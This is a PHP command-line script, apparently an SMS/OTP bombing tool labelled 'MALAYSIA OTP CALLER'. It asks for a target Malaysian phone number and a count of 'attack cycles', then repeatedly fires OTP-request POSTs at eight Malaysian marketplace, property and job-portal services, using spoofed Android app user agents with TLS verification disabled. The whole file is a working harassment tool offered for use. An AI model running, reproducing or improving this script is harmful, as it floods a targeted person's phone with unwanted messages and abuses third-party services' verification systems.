<?php

class MalaysiaCaller {
    private $number;
    
    private function formatNumber($number) {
        $number = preg_replace('/[^0-9]/', '', $number);
        
        if (substr($number, 0, 2) == "60") {
            return $number;
        } elseif (substr($number, 0, 1) == "0") {
            return "60" . substr($number, 1);
        } else {
            return "60" . $number;
        }
    }
    
    private function curlRequest($url, $postData, $headers = []) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Don't use curl_close() - it's deprecated in PHP 8.5
        // Just let it go out of scope
        
        return ['code' => $httpCode, 'response' => $response];
    }
    
    private function carousellCall($no) {
        $url = "https://www.carousell.com.my/api/v1/otp/send/";
        $post = "phone=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: Carousell/4.5.0 (Android 11; SM-G998B)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json",
            "X-Requested-With: XMLHttpRequest"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function mudahCall($no) {
        $url = "https://www.mudah.my/api/otp/request";
        $post = "mobile=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: Mudah/4.0.0 (Android 11; RMX3360)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function propertyGuruCall($no) {
        $url = "https://www.propertyguru.com.my/api/v1/otp/send";
        $post = "phone=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: PropertyGuru/3.8.0 (Android 11; SM-A525F)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function ipropertyCall($no) {
        $url = "https://www.iproperty.com.my/api/v1/otp/send";
        $post = "mobile_no=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: iProperty/2.9.0 (Android 11; V2134)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function jobsMalaysiaCall($no) {
        $url = "https://www.jobsmalaysia.gov.my/api/otp/send";
        $post = "phone_number=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: JobsMalaysia/1.5.0 (Android 11; M2007J20CG)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function myfutureJobsCall($no) {
        $url = "https://www.myfuturejobs.gov.my/api/otp/request";
        $post = "phone=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: MyFutureJobs/2.0.0 (Android 11; Redmi Note 10)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function mudahDotMyCall($no) {
        $url = "https://www.mudah.my/api/v2/otp/send";
        $post = "phone=" . urlencode($no) . "&country=60";
        $headers = [
            "User-Agent: mudah.my/3.0.0 (Android 11; Samsung S21)",
            "Content-Type: application/x-www-form-urlencoded",
            "Origin: https://www.mudah.my"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    private function mudahMobileCall($no) {
        $url = "https://api.mudah.my/v1/otp/request";
        $post = "phone_number=" . urlencode($no) . "&country_code=60";
        $headers = [
            "User-Agent: mudah.my/4.0.0 (Android 11; SM-G998B)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest($url, $post, $headers);
        return $result['code'] == 200;
    }
    
    public function run() {
        system('clear');
        
        echo "\n╔══════════════════════════════════════╗\n";
        echo "║     MALAYSIA OTP CALLER - v3.0       ║\n";
        echo "║         Fixed for PHP 8.5            ║\n";
        echo "║         Works with 011 numbers       ║\n";
        echo "╚══════════════════════════════════════╝\n\n";
        
        echo "[!] Supported prefixes: 011, 012, 013, 014, 016, 017, 018, 019, 010\n";
        echo "[!] Using multiple Malaysian services\n\n";
        
        // Get phone number
        while (true) {
            echo "Enter Malaysian number: ";
            $input = trim(fgets(STDIN));
            $clean = preg_replace('/[^0-9]/', '', $input);
            
            if (strlen($clean) >= 9 && strlen($clean) <= 12) {
                $this->number = $this->formatNumber($clean);
                break;
            } else {
                echo "❌ Invalid number! Must be 9-12 digits\n\n";
            }
        }
        
        // Get number of cycles
        while (true) {
            echo "How many attack cycles? (1-5): ";
            $cycles = trim(fgets(STDIN));
            
            if (is_numeric($cycles) && $cycles > 0 && $cycles <= 5) {
                break;
            } else {
                echo "❌ Enter 1-5\n";
            }
        }
        
        echo "\n[+] Target: {$this->number}\n";
        echo "[+] Attack cycles: $cycles\n";
        echo "[+] Starting multi-service attack...\n\n";
        
        $services = [
            'Carousell MY' => 'carousellCall',
            'Mudah.my' => 'mudahCall',
            'PropertyGuru' => 'propertyGuruCall',
            'iProperty' => 'ipropertyCall',
            'JobsMalaysia' => 'jobsMalaysiaCall',
            'MyFutureJobs' => 'myfutureJobsCall',
            'Mudah.v2' => 'mudahDotMyCall',
            'Mudah Mobile' => 'mudahMobileCall'
        ];
        
        $totalSuccess = 0;
        $totalFailed = 0;
        
        for ($cycle = 1; $cycle <= $cycles; $cycle++) {
            echo "══════════════════════════════════════\n";
            echo "CYCLE $cycle of $cycles\n";
            echo "══════════════════════════════════════\n";
            
            $cycleSuccess = 0;
            $cycleFailed = 0;
            
            foreach ($services as $name => $method) {
                echo "[*] Sending OTP via $name... ";
                ob_flush();
                flush();
                
                try {
                    if ($this->$method($this->number)) {
                        echo "✅ SUCCESS\n";
                        $cycleSuccess++;
                        $totalSuccess++;
                    } else {
                        echo "❌ FAILED\n";
                        $cycleFailed++;
                        $totalFailed++;
                    }
                } catch (Exception $e) {
                    echo "⚠️ ERROR\n";
                    $cycleFailed++;
                    $totalFailed++;
                }
                
                sleep(rand(2, 4));
            }
            
            echo "\n[+] Cycle $cycle results: ✅ $cycleSuccess | ❌ $cycleFailed\n\n";
            
            if ($cycle < $cycles) {
                echo "[*] Waiting 30 seconds before next cycle...\n";
                sleep(30);
            }
        }
        
        echo "\n══════════════════════════════════════\n";
        echo "FINAL RESULTS\n";
        echo "══════════════════════════════════════\n";
        echo "Target: {$this->number}\n";
        echo "Total Cycles: $cycles\n";
        echo "Total Successful: $totalSuccess\n";
        echo "Total Failed: $totalFailed\n";
        
        $total = $totalSuccess + $totalFailed;
        if ($total > 0) {
            $rate = round(($totalSuccess / $total) * 100, 2);
            echo "Success Rate: $rate%\n";
        }
        
        echo "══════════════════════════════════════\n\n";
    }
}

// Check PHP version
echo "PHP Version: " . phpversion() . "\n";

// Check curl
if (!function_exists('curl_init')) {
    die("❌ Install PHP CURL: pkg install php-curl\n");
}

echo "✅ CURL is installed\n";
echo "✅ No deprecated functions used\n\n";

// Run
try {
    $caller = new MalaysiaCaller();
    $caller->run();
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

?>
